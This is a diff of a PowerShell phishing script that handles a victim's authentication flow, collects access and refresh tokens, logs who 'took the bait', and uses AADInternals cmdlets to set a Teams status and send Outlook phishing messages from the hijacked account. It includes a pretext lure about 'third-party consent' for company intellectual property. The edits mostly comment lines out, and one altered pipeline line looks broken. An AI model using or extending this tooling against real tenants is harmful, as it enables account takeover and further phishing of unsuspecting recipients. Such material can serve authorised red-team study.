@@ -34,7 +34,6 @@ if ([string]::IsNullOrWhiteSpace($Token)) {
 
 
 Write-Output "Victim authentication flow"
-Write-Output "Response value is $response"
 
 $access = $response.access_token
 $refresh = $response.refresh_token
@@ -49,7 +48,7 @@ Write-Output "$user took the bait."
 
 # Other process listens for creation of this file, validates target with feedback from the token
 $switch = "$user"
-$switch | Out-File -Path .\target.txt 
+$switch | Write-Output "$user" > target.txt 
 
 if ($azureAd) {
     try {
@@ -151,6 +150,8 @@ function Send-TeamsMessageWithRetry {
     Write-Host "Failed to send message to $Recipient after $maxRetries attempts."
 }
 
+
+
 ### Conditional logic for Sending Messages
 if ($targetUser) {
     if ($targetUser -eq "all") {
@@ -166,12 +167,19 @@ if ($targetUser) {
         }
     } else {
         Write-Output "Setting user status message to 'Gone Phishin'"
-        Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
+        # Set-AADIntTeamsStatusMessage -Message "Gone Phishin'" -AccessToken $MSTeamsToken.access_token -Verbose
         # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
         Write-Output "Sending message..."        
         $mailuser = $targetUser
-        if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
-        if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
+        # if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
+        # if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
+        
+        
+        
+        # $subject = "Third-Party Consent for use of your company's intellectual property"
+        # $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"
+        # $teamsMessage = $messageContent
+    
         Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage
     }
 } else {
